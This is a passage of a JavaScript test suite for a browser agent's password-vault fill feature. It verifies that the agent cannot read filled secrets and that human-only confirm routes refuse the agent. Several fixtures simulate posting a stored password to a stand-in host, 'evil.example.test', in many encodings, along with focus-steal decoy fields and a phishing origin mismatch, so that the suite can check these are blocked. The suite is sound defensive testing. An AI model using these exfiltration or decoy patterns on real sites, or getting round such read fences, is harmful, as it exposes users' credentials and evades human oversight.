  const fk = await startFakeKernel({ firstUrl: 'https://shop.example.test/login' });
  const tid = fk.targets()[0].targetId;

  const stubKeeper = {
    resolveFor: () => ({ ok: true, kind: 'attachment', handle: 'shop', attachment: { profileId: PID, alias: 'shop', isDefault: true }, handles: ['shop'], isDefault: true }),
    attach: async () => ({ profile: prof, browser: { state: 'ready' }, lease: { profileId: PID, browserKey: KEY, sessionId: SID, since: clock }, env: [], pinTab: false, others: 0 }),
    statusFor: () => ({ ephemeral: null, leases: [{ profileId: PID, browserKey: KEY, sessionId: SID }] }),
    socketRootOf: () => ({ socketDir: path.join(XDG, 'ab'), runtimeDir: XDG }),
    configFileFor: () => null,
    clock: () => clock,
    profile: (id) => (id === PID ? prof : null),
    profileByRef: (r) => (r === PID || r === 'shop' ? prof : null),
    setFor: () => ({ attachments: [{ profileId: PID, alias: 'shop', label: 'ShopProfile', isDefault: true }], handles: ['shop'] }),
    audit() {},
    noteLeaseUrl() {},
    leasesFor: () => [{ profileId: PID, browserKey: KEY, sessionId: SID }],
    inputStateFor: () => ({ input: isTakeover ? 'user' : 'agent', takenAt: isTakeover ? clock : 0 }),
    ephemeralFor: () => null,
    cdpEndpointFor: async (id) => (id === PID ? { ok: true, url: fk.wsUrl } : { ok: false }),
    onLease: () => () => {},
    saveLoginFenceState: (id, st) => keeper.saveLoginFenceState(id, st),
    loginFenceStateOf: (id) => keeper.loginFenceStateOf(id),
    loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => stubLoginChannel({ ephemeral, remoteSession, hasCdp: Boolean(fk.wsUrl), label: prof.label, action }),
  };

  const watch = Dm.create({
    keeper: stubKeeper,
    log: logSink,
    enableTimeoutMs: 400,
    now: () => clock,
    holdersOf: () => [{ browserKey: KEY, sessionId: SID }],
    leaseCountOf: () => 1,
    labelOf: () => 'ShopProfile',
    logins,
    takeoverOf: () => isTakeover,
    conversationOf: () => ({ cid: CID, name: 'Shop Agent' }),
  });

  const sessions = new Map([[SID, { agentToken: TOKEN, _browserKey: KEY, _browserVariant: 'D', name: 'Shop Agent', cwd: ROOT4, backendSessionId: CID }]]);
  Rm.setup({ keeper: stubKeeper, activeSessions: sessions, dialogs: watch, logins, tasksForSession: () => [] });

  const app = express();
  app.use(express.json());
  app.use(Rm.router);
  VRm.registerVaultRoutes(app, {
    vault: eng,
    activeSessions: sessions,
    logins,
    who: () => 'owner',
    log: () => {},
  });
  const srv = http.createServer(app);
  const port = await freePort();
  await new Promise((r) => srv.listen(port, '127.0.0.1', r));
  const API = `http://127.0.0.1:${port}`;

  const PWF = path.join(ROOT4, 'passwd.cjs');
  fs.writeFileSync(PWF, `const os = require('os'); const real = os.userInfo; os.userInfo = (o) => ({ ...real(o), homedir: ${JSON.stringify(HOME)} });\n`);
  fs.mkdirSync(path.join(XDG, 'ab'), { recursive: true, mode: 0o700 });
  const cliEnv = {
    PATH: `${BIN}:${path.dirname(process.execPath)}:/usr/bin:/bin`,
    HOME,
    XDG_RUNTIME_DIR: XDG,
    VIBESPACE_API: API,
    VIBESPACE_SESSION_TOKEN: TOKEN,
    VIBESPACE_SESSION_CWD: ROOT4,
  };
  const runCli = (args) => new Promise((resolve) => {
    const c = spawn(process.execPath, ['--require', PWF, path.join(REPO, 'data/bin/vibespace-browser'), ...args], { env: cliEnv, cwd: ROOT4 });
    let out = '', err = '';
    c.stdout.on('data', (d) => { out += d; });
    c.stderr.on('data', (d) => { err += d; });
    c.on('exit', (code) => resolve({ code, out, err }));
  });
  const reqJson = async (method, p, body, headers = {}) => {
    const r = await fetch(API + p, {
      method,
      headers: { ...(body !== undefined ? { 'Content-Type': 'application/json' } : {}), ...headers },
      body: body !== undefined ? JSON.stringify(body) : undefined,
    });
    const text = await r.text();
    let json = null; try { json = JSON.parse(text); } catch {}
    return { status: r.status, json, text };
  };
  const agentHdr = { Authorization: `Bearer ${TOKEN}` };
  const ownerHdr = { Origin: API };

  try {
    await watch.arm(PID);
    const hasPrimitive = ok(typeof watch.fillVaultField === 'function' && typeof watch.noteSnapshot === 'function', 'browser-dialogs exports fillVaultField + noteSnapshot');

    // Ruling 3: `vibespace-browser login` is retired + old `/api/agent/browser/login` route is gone
    const retCli = await runCli(['login']);
    const oldRoute = await reqJson('POST', '/api/agent/browser/login', { profile: PID }, agentHdr);
    ok(retCli.code === 1 && /\[login_retired\]/.test(retCli.err) && /fill @ref --vault/.test(retCli.err) && oldRoute.status === 404,
      'RULING 3: `vibespace-browser login` exits 1 [login_retired] teaching snapshot+fill --vault, and POST /api/agent/browser/login is 404',
      { code: retCli.code, err: retCli.err.trim(), oldStatus: oldRoute.status });

    if (hasPrimitive) {
      // Set up login + hijack + iframe + text-input DOM on fake kernel
      fk.setDom(tid, {
        url: 'https://shop.example.test/login',
        childFrames: [{ id: `${tid}-CF1`, url: 'https://embed.example.test/form' }],
        elements: [
          { id: 'u', tag: 'input', type: 'email', name: 'Email' },
          { id: 'pw', tag: 'input', type: 'password', name: 'Password' },
          { id: 'otp', tag: 'input', type: 'text', name: 'One-time code' },
          { id: 'plain', tag: 'input', type: 'text', name: 'Plain text' },
          { id: 'decoy', tag: 'input', type: 'password', name: 'Decoy' },
          { id: 'trap_focus', tag: 'input', type: 'password', name: 'Trap focus', focusHijackId: 'decoy' },
          { id: 'trap_clear', tag: 'input', type: 'password', name: 'Trap clear', value: 'prefilled', hijackBeforeInsert: true },
          { id: 'frame_el', tag: 'iframe', type: 'iframe', name: 'Frame host' },
          { id: 'sub_pw', tag: 'input', type: 'password', name: 'Child password', frameId: `${tid}-CF1` },
        ],
      });
      await watch.noteSnapshot(
        { profileId: PID, browserKey: KEY },
        '- textbox "Email" [ref=e1]\n- textbox "Password" [ref=e2]\n- textbox "One-time code" [ref=e3]\n- textbox "Plain text" [ref=e4]\n- textbox "Trap focus" [ref=e5]\n- textbox "Trap clear" [ref=e6]\n- textbox "Child password" [ref=e7]',
      );

      const spawns0 = abSpawns();
      const cUser = await runCli(['fill', '@e1', '--vault', 'shop.example.test#alice/user']);
      const cPass = await runCli(['fill', '@e2', '--vault', 'shop.example.test#alice/password']);
      const cOtp = await runCli(['fill', '@e3', '--vault', 'shop.example.test#alice/otp']);
      const vals1 = fk.readDomValues(tid);
      ok(cUser.code === 0 && cPass.code === 0 && cOtp.code === 0 && abSpawns() === spawns0
        && vals1.u === 'alice' && vals1.pw === PW_ALICE && vals1.otp === OTP_VAL && totpCalls === 1
        && !cPass.out.includes(PW_ALICE) && !cPass.err.includes(PW_ALICE) && !cOtp.out.includes(OTP_VAL)
        && /Receipt vr-[0-9a-f]{12}\./.test(cPass.out),
        'RULING 4 & 5a + r26: `fill @ref --vault` resolves Hub backendNodeId with ZERO agent-browser spawns, mints OTP once (totpCalls===1), populates main-world input.value, and leaks zero secret',
        { spawnsDelta: abSpawns() - spawns0, vals1, out: cPass.out.trim() });

      // Ruling 4: live-fill read fence blocks eval/get/screenshot with 409 login_fill_live while allowing click/press
      const resEval = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['eval', 'document.querySelector("#pw").value'] }, agentHdr);
      const resGet = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['get', 'value', '@e2'] }, agentHdr);
      const resShot = await reqJson('POST', '/api/agent/browser/direct', { profile: PID, action: 'screenshot' }, agentHdr);
      const resClick = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['click', '@e1'] }, agentHdr);
      ok(resEval.status === 409 && resEval.json?.code === 'login_fill_live'
        && resGet.status === 409 && resGet.json?.code === 'login_fill_live'
        && resShot.status === 409 && resShot.json?.code === 'login_fill_live'
        && resClick.status === 200,
        'RULING 4: before submit, eval / get value / screenshot are refused 409 login_fill_live while click passes',
        { eval: resEval.status, get: resGet.status, shot: resShot.status, click: resClick.status });

      // Accidental cross-origin credential leak fence across L1 encodings + deduplicated For-you notice + fail-closed undecodable bodies (Ruling A)
      const hasL1Exports = ok(
        typeof Dm.credSigOf === 'function'
          && typeof Dm.inspectRequestBody === 'function'
          && typeof Dm.bodyCarriesCredential === 'function'
          && typeof Dm.urlCarriesCredential === 'function'
          && typeof Dm.headersCarryCredential === 'function',
        'L1: browser-dialogs exports credSigOf + inspectRequestBody + bodyCarriesCredential + urlCarriesCredential + headersCarryCredential',
      );
      if (hasL1Exports) {
        const sigsAlice = [Dm.credSigOf(PW_ALICE)].filter(Boolean);
        const mpBoundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW';
        const mpCt = `multipart/form-data; boundary=${mpBoundary}`;
        const mpSecretBody = `--${mpBoundary}\r\nContent-Disposition: form-data; name="user"\r\n\r\nalice\r\n--${mpBoundary}\r\nContent-Disposition: form-data; name="pw"\r\n\r\n${PW_ALICE}\r\n--${mpBoundary}--\r\n`;
        const mpBenignBody = `--${mpBoundary}\r\nContent-Disposition: form-data; name="note"\r\n\r\nharmless-ping\r\n--${mpBoundary}--\r\n`;
        const pwB64 = Buffer.from(PW_ALICE, 'utf8').toString('base64');

        const exUrl = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil.example.test/collect', headers: { 'content-type': 'application/x-www-form-urlencoded' }, postData: `pw=${encodeURIComponent(PW_ALICE)}` });
        const exUrl2 = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil.example.test/collect', headers: { 'content-type': 'application/x-www-form-urlencoded' }, postData: `pw=${encodeURIComponent(PW_ALICE)}` });
        const exJsonPlain = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil.example.test/json1', headers: { 'content-type': 'application/json' }, postData: JSON.stringify({ pw: PW_ALICE }) });
        const exJsonNested = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil.example.test/json2', headers: { 'content-type': 'application/json; charset=utf-8' }, postData: JSON.stringify({ meta: { v: 1 }, auth: { deep: { secret: PW_ALICE } } }) });
        const exMp = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil.example.test/mp', headers: { 'content-type': mpCt }, postData: mpSecretBody });
        const exMpFallback = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil.example.test/mp2', headers: { 'content-type': mpCt }, omitInlinePostData: true, fullPostData: mpSecretBody });
        const exTextCrlf = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil.example.test/txt1', headers: { 'content-type': 'text/plain' }, postData: `user=alice\r\npw=${PW_ALICE}\r\n` });
        const exTextPref = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil.example.test/txt2', headers: { 'content-type': 'text/plain' }, postData: `token:${PW_ALICE}` });
        const exB64Body = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil.example.test/b64', headers: { 'content-type': 'text/plain' }, postData: `payload=${pwB64}` });
        const exQueryB64 = await fk.simulateSubmitRequest({ targetId: tid, method: 'GET', url: `https://evil.example.test/q?blob=${encodeURIComponent(pwB64)}`, postData: '' });
        const exCustomHdr = await fk.simulateSubmitRequest({ targetId: tid, method: 'POST', url: 'https://evil.example.test/hdr', headers: { 'x-api-secret': PW_ALICE, 'content-type': 'text/plain' }, postData: 'ok=1' });
        const exHarmlessMp = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil.example.test/benign-mp', headers: { 'content-type': mpCt }, postData: mpBenignBody, finish: false });
        const exBinUndec = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil-bin.example.test/bin', headers: { 'content-type': 'application/octet-stream' }, postData: 'raw-binary-bytes' });
        const exGzipUndec = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil-bin.example.test/gz', headers: { 'content-type': 'application/json', 'content-encoding': 'gzip' }, postData: 'compressed' });
        const exMissingBody = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil-bin.example.test/evicted', headers: { 'content-type': 'text/plain' }, omitInlinePostData: true, hasPostData: true, getPostDataError: 'No data found for resource' });

        const crossNotices = [...fyItems.values()].filter((x) => x.kind === 'notice' && /evil\.example\.test/.test(`${x.text || ''} ${x.detail || ''}`));
        const binNotices = [...fyItems.values()].filter((x) => x.kind === 'notice' && /evil-bin\.example\.test/.test(`${x.text || ''} ${x.detail || ''}`));
        ok(
          [exUrl, exUrl2, exJsonPlain, exJsonNested, exMp, exMpFallback, exTextCrlf, exTextPref, exB64Body, exQueryB64, exCustomHdr].every((r) => r.action === 'fail' && r.errorReason === 'BlockedByClient')
            && exHarmlessMp.action === 'continue'
            && [exBinUndec, exGzipUndec, exMissingBody].every((r) => r.action === 'fail' && r.errorReason === 'BlockedByClient')
            && crossNotices.length === 1
            && binNotices.length === 1
            && hubLogs.some((l) => /undecodable_body/.test(l))
            && Dm.bodyCarriesCredential(mpSecretBody, sigsAlice, mpCt) === true
            && Dm.bodyCarriesCredential(mpBenignBody, sigsAlice, mpCt) === false,
          'L1: cross-origin urlencoded / json / nested-json / multipart / Fetch.getRequestPostData / text-plain / base64 / GET-query / custom-header all BlockedByClient with 1 dedup notice; harmless multipart allowed; undecodable binary/gzip/evicted bodies fail closed + logged',
          { exMp, exHarmlessMp, exBinUndec, crossNotices: crossNotices.length, binNotices: binNotices.length },
        );

        // Same-origin submissions in all encodings are allowed; non-navigating submit wipes input.value === '' and lifts 409 fence!
        const sameJson = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://shop.example.test/api/json', headers: { 'content-type': 'application/json' }, postData: JSON.stringify({ nested: { pw: PW_ALICE } }), finish: false });
        const sameMp = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://shop.example.test/api/mp', headers: { 'content-type': mpCt }, postData: mpSecretBody, finish: false });
        const sameTxt = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://shop.example.test/api/txt', headers: { 'content-type': 'text/plain' }, postData: `pw=${PW_ALICE}\r\n`, finish: false });
        const sameQuery = await fk.simulateSubmitRequest({ targetId: tid, method: 'GET', url: `https://shop.example.test/api/q?q=${encodeURIComponent(pwB64)}`, postData: '', finish: false });
        const subOk = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://shop.example.test/api/login', headers: { 'content-type': 'application/x-www-form-urlencoded' }, postData: `u=alice&pw=${encodeURIComponent(PW_ALICE)}`, finish: true });
        for (let i = 0; i < 40 && !watch.liveFillVerdictFor({ profileId: PID, browserKey: KEY }, { verb: 'eval', argv: ['eval', '1'] }).ok; i++) {
          await new Promise((r) => setTimeout(r, 10));
        }
        const valsAfterSubmit = fk.readDomValues(tid);
        const resEvalAfter = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['eval', '1+1'] }, agentHdr);
        ok([sameJson, sameMp, sameTxt, sameQuery, subOk].every((r) => r.action === 'continue') && valsAfterSubmit.pw === '' && resEvalAfter.status === 200,
          'L1 + RULING 4: same-origin urlencoded/json/multipart/text/query all continue; submit completion wipes input.value and lifts 409 fence',
          { valsAfterSubmit, evalStatus: resEvalAfter.status });
      }

      // Output scrubbing remains active after fence lift until browser stop
      const audScrub = await reqJson('POST', '/api/agent/browser/audit', { profile: PID, verb: 'get', ok: true, output: { out: `leaked=${PW_ALICE}`, err: '' } }, agentHdr);
      ok(audScrub.status === 200 && !audScrub.text.includes(PW_ALICE) && /\[vault:web-login:/.test(audScrub.json?.scrubbed?.out || ''),
        'RULING 4: scrubOutput redacts filled secret from CLI output even after submit lifted the read fence', audScrub.json);

      // L5 + Ruling 5a (Ruling A accidental focus-steal guard): Focus-steal traps (sync, queueMicrotask, setTimeout(0) to <input type="text"> decoy + clear-steal) refused with ZERO chars typed!
      fk.setDom(tid, {
        url: 'https://shop.example.test/login',
        childFrames: [{ id: `${tid}-CF1`, url: 'https://embed.example.test/form' }],
        elements: [
          { id: 'u', tag: 'input', type: 'email', name: 'Email' },
          { id: 'pw', tag: 'input', type: 'password', name: 'Password' },
          { id: 'plain', tag: 'input', type: 'text', name: 'Plain text' },
          { id: 'decoy_txt', tag: 'input', type: 'text', name: 'Decoy text' },
          { id: 'trap_sync', tag: 'input', type: 'password', name: 'Trap sync', focusHijackId: 'decoy_txt', focusHijackMode: 'sync' },
          { id: 'trap_micro', tag: 'input', type: 'password', name: 'Trap micro', focusHijackId: 'decoy_txt', focusHijackMode: 'microtask' },
          { id: 'trap_timeout', tag: 'input', type: 'password', name: 'Trap timeout', focusHijackId: 'decoy_txt', focusHijackMode: 'timeout' },
          { id: 'trap_clear', tag: 'input', type: 'password', name: 'Trap clear', value: 'prefilled', hijackBeforeInsert: true },
          { id: 'frame_el', tag: 'iframe', type: 'iframe', name: 'Frame host' },
          { id: 'sub_pw', tag: 'input', type: 'password', name: 'Child password', frameId: `${tid}-CF1` },
        ],
      });
      await watch.noteSnapshot(
        { profileId: PID, browserKey: KEY },
        '- textbox "Email" [ref=e1]\n- textbox "Password" [ref=e2]\n- textbox "Plain text" [ref=e4]\n- textbox "Trap sync" [ref=e5]\n- textbox "Trap clear" [ref=e6]\n- textbox "Child password" [ref=e7]\n- textbox "Trap micro" [ref=e8]\n- textbox "Trap timeout" [ref=e9]',
      );
      const insertsBeforeTrap = fk.calls().filter((c) => c.method === 'Input.insertText').length;
      const trapSync = await runCli(['fill', '@e5', '--vault', 'shop.example.test#alice/password']);
      const trapMicro = await runCli(['fill', '@e8', '--vault', 'shop.example.test#alice/password']);
      const trapTimeout = await runCli(['fill', '@e9', '--vault', 'shop.example.test#alice/password']);
      const trapClear = await runCli(['fill', '@e6', '--vault', 'shop.example.test#alice/password']);
      const insertsAfterTrap = fk.calls().filter((c) => c.method === 'Input.insertText').length;
      const trapVals = fk.readDomValues(tid);
      const trapCounts = fk.readDomInputCounts ? fk.readDomInputCounts(tid) : { decoy_txt: { inputEvents: 0 } };
      ok(trapSync.code === 1 && /\[login_form_changed\]/.test(trapSync.err)
        && trapMicro.code === 1 && /\[login_form_changed\]/.test(trapMicro.err)
        && trapTimeout.code === 1 && /\[login_form_changed\]/.test(trapTimeout.err)
        && trapClear.code === 1 && /\[login_form_changed\]/.test(trapClear.err)
        && insertsAfterTrap === insertsBeforeTrap
        && trapVals.decoy_txt === '' && trapCounts.decoy_txt.inputEvents === 0
        && trapVals.trap_sync === '' && trapVals.trap_micro === '' && trapVals.trap_timeout === '' && trapVals.trap_clear === '',
        'L5 + RULING 5a: sync, queueMicrotask, and setTimeout(0) focus steals to <input type="text"> decoy all refuse login_form_changed with 0 Input.insertText calls and 0 decoy chars/events',
        { insertsBeforeTrap, insertsAfterTrap, trapVals, decoyEvents: trapCounts.decoy_txt });

      // Ruling 5b: Frame & unmasked input & origin refusals
      const fRef = await runCli(['fill', '@e7', '--vault', 'shop.example.test#alice/password']);
      const fSelChild = await runCli(['fill', '#sub_pw', '--vault', 'shop.example.test#alice/password']);
      const fSelTag = await runCli(['fill', '#frame_el', '--vault', 'shop.example.test#alice/password']);
      const badMask = await runCli(['fill', '@e4', '--vault', 'shop.example.test#alice/password']);
      ok(fRef.code === 1 && /\[login_in_frame\]/.test(fRef.err)
        && fSelChild.code === 1 && /\[login_in_frame\]/.test(fSelChild.err)
        && fSelTag.code === 1 && /\[login_in_frame\]/.test(fSelTag.err)
        && badMask.code === 1 && /\[login_bad_field\]/.test(badMask.err) && fk.readDomValues(tid).plain === '',
        'RULING 5b: child-frame @ref, child-frame CSS selector, <iframe> element => login_in_frame; <input type="text"> => login_bad_field',
        { fRef: fRef.err.trim(), fSelChild: fSelChild.err.trim(), fSelTag: fSelTag.err.trim(), badMask: badMask.err.trim() });

      // L4: Two same-origin tabs A & B — `@ref` from tab A's superseded snapshot NEVER falls back to tab A when tab B is active!
      const tidB = fk.addTarget('https://shop.example.test/search');
      for (let i = 0; i < 30 && !fk.calls().some((c) => c.method === 'Target.attachToTarget' || c.tab === tidB); i++) {
        await new Promise((r) => setTimeout(r, 10));
      }
      fk.setDom(tid, { url: 'https://shop.example.test/login', elements: [{ id: 'u', tag: 'input', type: 'email', name: 'Email' }, { id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
      fk.setDom(tidB, { url: 'https://shop.example.test/search', elements: [{ id: 'q', tag: 'input', type: 'text', name: 'Search' }] });
      watch.noteActiveTab({ profileId: PID, browserKey: KEY }, tid);
      await watch.noteSnapshot({ profileId: PID, browserKey: KEY }, '- textbox "Email" [ref=e1]\n- textbox "Password" [ref=e2]');
      watch.noteActiveTab({ profileId: PID, browserKey: KEY }, tidB);
      await watch.noteSnapshot({ profileId: PID, browserKey: KEY }, '- textbox "Search" [ref=e1]');
      const insBeforeL4 = fk.calls().filter((c) => c.method === 'Input.insertText').length;
      const crossTabPw = await runCli(['fill', '@e2', '--vault', 'shop.example.test#alice/password']);
      const crossTabUser = await runCli(['fill', '@e2', '--vault', 'shop.example.test#alice/user']);
      const insAfterL4 = fk.calls().filter((c) => c.method === 'Input.insertText').length;
      ok(crossTabPw.code === 1 && /\[target_not_found\]/.test(crossTabPw.err)
        && crossTabUser.code === 1 && /\[target_not_found\]/.test(crossTabUser.err)
        && insAfterL4 === insBeforeL4 && fk.readDomValues(tid).pw === '' && fk.readDomValues(tid).u === '',
        'L4: `@ref` absent from active tab B refuses [target_not_found] with 0 Input.insertText calls and never types into background tab A',
        { pwErr: crossTabPw.err.trim(), userErr: crossTabUser.err.trim(), tabAVals: fk.readDomValues(tid) });
      watch.noteActiveTab({ profileId: PID, browserKey: KEY }, tid);

      fk.setDom(tid, { url: 'https://shop.example.test/login', origin: 'https://evil.example.test', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
      const phishDom = await runCli(['fill', '#pw', '--vault', 'shop.example.test#alice/password']);
      ok(phishDom.code === 1 && /\[login_phishing\]/.test(phishDom.err), 'browser-vs-DOM origin mismatch refused login_phishing');

      // M1: Locked vault on wrong-origin tab refuses 423 vault_locked BEFORE any CDP call (both CLI and HTTP); bad_request => 400!
      fk.setDom(tid, { url: 'https://evil.example.test/phish', elements: [{ id: 'npw', tag: 'input', type: 'password', name: 'Password' }] });
      eng.lock();
      const cdpMarkLocked = fk.mark();
      const lockedCli = await runCli(['fill', '#npw', '--vault', 'shop.example.test#alice/password']);
      const lockedHttp = await reqJson('POST', '/api/agent/browser/fill-vault', { profile: PID, target: '#npw', spec: 'shop.example.test#alice/password' }, agentHdr);
      const lockedWatch = await watch.fillVaultField({ profileId: PID, browserKey: KEY }, { target: '#npw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: [CID] } });
      const cdpCallsWhileLocked = fk.calls().filter((c) => c.seq > cdpMarkLocked);
      ok(lockedCli.code === 1 && /\[vault_locked\]/.test(lockedCli.err)
        && lockedHttp.status === 423 && lockedHttp.json?.code === 'vault_locked'
        && lockedWatch.code === 'vault_locked'
        && cdpCallsWhileLocked.length === 0,
        'M1: locked vault on wrong-origin tab refuses 423 [vault_locked] across CLI, HTTP, and watch with ZERO CDP calls',
        { cliErr: lockedCli.err.trim(), httpStatus: lockedHttp.status, cdpCalls: cdpCallsWhileLocked });
      await eng.unlock(VPW);

      const cdpMarkBad = fk.mark();
      const badGenUser = await reqJson('POST', '/api/agent/browser/fill-vault', { profile: PID, target: '#npw', spec: 'shop.example.test#alice/user', generate: true }, agentHdr);
      const badNewNoGen = await reqJson('POST', '/api/agent/browser/fill-vault', { profile: PID, target: '#npw', spec: 'new:shop.example.test#x/password', generate: false }, agentHdr);
      const badUnknownField = await reqJson('POST', '/api/agent/browser/fill-vault', { profile: PID, target: '#npw', spec: 'shop.example.test#alice/secret' }, agentHdr);
      ok(badGenUser.status === 400 && badGenUser.json?.code === 'bad_request'
        && badNewNoGen.status === 400 && badNewNoGen.json?.code === 'bad_request'
        && badUnknownField.status === 400 && badUnknownField.json?.code === 'bad_request'
        && fk.calls().filter((c) => c.seq > cdpMarkBad).length === 0,
        'M1 / Minor: invalid fill-vault spec shapes (--generate on /user, new: without --generate, unknown field) return HTTP 400 bad_request with 0 CDP calls',
        { badGenUser: badGenUser.status, badNewNoGen: badNewNoGen.status, badUnknownField: badUnknownField.status });

      fk.setDom(tid, {
        url: 'https://shop.example.test/register',
        elements: [
          { id: 'npw', tag: 'input', type: 'password', name: 'New password' },
          { id: 'cpw', tag: 'input', type: 'password', name: 'Confirm password' },
          { id: 'opw', tag: 'input', type: 'password', name: 'Old password' },
        ],
      });

      // Ruling 1 & 5 + L2: `new:<site>#bob/password --generate` + Vault window `{ name, rev: entry.rev }` Confirm & Discard at `rev >= 2`
      const genReg = await runCli(['fill', '#npw', '--vault', 'new:shop.example.test#bob/password', '--generate']);
      const bobName = BL.entryName('https://shop.example.test', 'bob');
      const bobRec1 = BL.recordOf(eng.secretGet(bobName).value.toString('utf8'));
      const PW_BOB_1 = bobRec1?.pending?.password || '';
      const openPendingCards1 = [...fyItems.values()].filter((x) => x.status === 'open' && x.action?.type === 'save-login' && x.action?.pending === 'register');
      ok(genReg.code === 0 && PW_BOB_1.length === 24 && bobRec1?.current === null && bobRec1?.pending?.kind === 'register'
        && fk.readDomValues(tid).npw === PW_BOB_1 && !genReg.out.includes(PW_BOB_1) && openPendingCards1.length === 1,
        'RULING 1 & 5: `new:... --generate` seals 24-char pending:"register" before typing, types into #npw, and files ONE For-you Confirm/Discard card',
        { len: PW_BOB_1.length, cards: openPendingCards1.length });

      // Unconfirmed register: `/password` resolves to `pending` so confirm-password / first sign-in works!
      const fillConfirmBox = await runCli(['fill', '#cpw', '--vault', 'shop.example.test#bob/password']);
      const dupGen = await runCli(['fill', '#cpw', '--vault', 'shop.example.test#bob/password', '--generate']);
      ok(fillConfirmBox.code === 0 && fk.readDomValues(tid).cpw === PW_BOB_1 && dupGen.code === 1 && /\[login_pending_exists\]/.test(dupGen.err),
        'RULING 1: while current===null, `/password` resolves to pending; second `--generate` refuses login_pending_exists');

      // Agent bearer CANNOT call human confirm/discard routes!
      const agConfirm = await reqJson('POST', '/api/vault/web-logins/confirm', { name: bobName }, agentHdr);
      const agDiscard = await reqJson('POST', '/api/vault/web-logins/discard', { name: bobName }, agentHdr);
      ok(agConfirm.status === 403 && agDiscard.status === 403,
        'RULING 1: the confirm/discard route refuses an agent bearer (403 human_only)', { agConfirm: agConfirm.status, agDiscard: agDiscard.status });

      // Human owner confirms via Vault window payload (`GET /api/vault/web-logins` -> `{ name, rev: entry.rev }`)
      const winList1 = await reqJson('GET', '/api/vault/web-logins', undefined, ownerHdr);
      const bobWin1 = (winList1.json?.entries || []).find((e) => e.name === bobName);
      const ownConfirm1 = await reqJson('POST', '/api/vault/web-logins/confirm', { name: bobName, ...(bobWin1?.rev != null ? { rev: bobWin1.rev } : {}) }, ownerHdr);
      const bobRec2 = BL.recordOf(eng.secretGet(bobName).value.toString('utf8'));
      ok(ownConfirm1.status === 200 && bobRec2.current?.password === PW_BOB_1 && bobRec2.pending === null && openPendingCards1[0].status === 'done',
        'RULING 1: owner Confirm promotes pending -> current and resolves the For-you card');

      // Password change `--generate` -> `pending: 'change'` at `rev === 3` (`rev >= 2`); `/password` resolves to `current` (`PW_BOB_1`), `/pending` to `PW_BOB_2`
      const genChg1 = await runCli(['fill', '#npw', '--vault', 'shop.example.test#bob/password', '--generate']);
      const bobRec3 = BL.recordOf(eng.secretGet(bobName).value.toString('utf8'));
      const PW_BOB_2 = bobRec3?.pending?.password || '';
      const fillCurWhilePending = await runCli(['fill', '#opw', '--vault', 'shop.example.test#bob/password']);
      const fillPendSlot = await runCli(['fill', '#cpw', '--vault', 'shop.example.test#bob/pending']);
      ok(genChg1.code === 0 && PW_BOB_2.length === 24 && PW_BOB_2 !== PW_BOB_1
        && fillCurWhilePending.code === 0 && fk.readDomValues(tid).opw === PW_BOB_1
        && fillPendSlot.code === 0 && fk.readDomValues(tid).cpw === PW_BOB_2,
        'RULING 1: during unconfirmed change, `/password` fills current and `/pending` fills candidate');

      // 7-day one-time reminder check through logins.maybeRemindPending
      clock += 6 * DAY;
      const rem6 = logins.maybeRemindPending(PID);
      clock += 2 * DAY; // +8d total
      const rem8 = logins.maybeRemindPending(PID);
      clock += 30 * DAY; // +38d total — still NOT auto-promoted and NO second reminder!
      const rem38 = logins.maybeRemindPending(PID);
      const bobAfter38d = BL.recordOf(eng.secretGet(bobName).value.toString('utf8'));
      ok(rem6 === 0 && rem8 === 1 && rem38 === 0 && bobAfter38d?.current?.password === PW_BOB_1 && bobAfter38d?.pending?.password === PW_BOB_2,
        'RULING 1: maybeRemindPending fires 0 times at +6d, ONCE at +8d, 0 times at +38d, and never promotes pending by clock',
        { rem6, rem8, rem38 });

      // L2: Vault window Discard on change (`rev >= 2`) using exact `{ name, rev: entry.rev }` from `GET /api/vault/web-logins`!
      const winListChg = await reqJson('GET', '/api/vault/web-logins', undefined, ownerHdr);
      const bobWinChg = (winListChg.json?.entries || []).find((e) => e.name === bobName);
      const ownDiscard = await reqJson('POST', '/api/vault/web-logins/discard', { name: bobName, ...(bobWinChg?.rev != null ? { rev: bobWinChg.rev } : {}) }, ownerHdr);
      const bobAfterDisc = BL.recordOf(eng.secretGet(bobName).value.toString('utf8'));
      ok(bobWinChg?.rev === bobAfter38d?.rev && (bobWinChg?.rev ?? 0) >= 2 && ownDiscard.status === 200 && bobAfterDisc?.current?.password === PW_BOB_1 && bobAfterDisc?.pending === null,
        'L2 + RULING 1: GET /api/vault/web-logins exposes rev>=2 on change pending, and Vault-window Discard ({name, rev}) clears pending without card_changed',
        { listRev: bobWinChg?.rev, sealedRev: bobAfter38d?.rev, status: ownDiscard.status });

      // L2: Second `--generate` change (`rev >= 4`), confirmed via Vault-window `{ name, rev: entry.rev }`, rotates `previous`!
      await runCli(['fill', '#npw', '--vault', 'shop.example.test#bob/password', '--generate']);
      const bobPend3 = BL.recordOf(eng.secretGet(bobName).value.toString('utf8'));
      const PW_BOB_3 = bobPend3?.pending?.password || '';
      const winListChg2 = await reqJson('GET', '/api/vault/web-logins', undefined, ownerHdr);
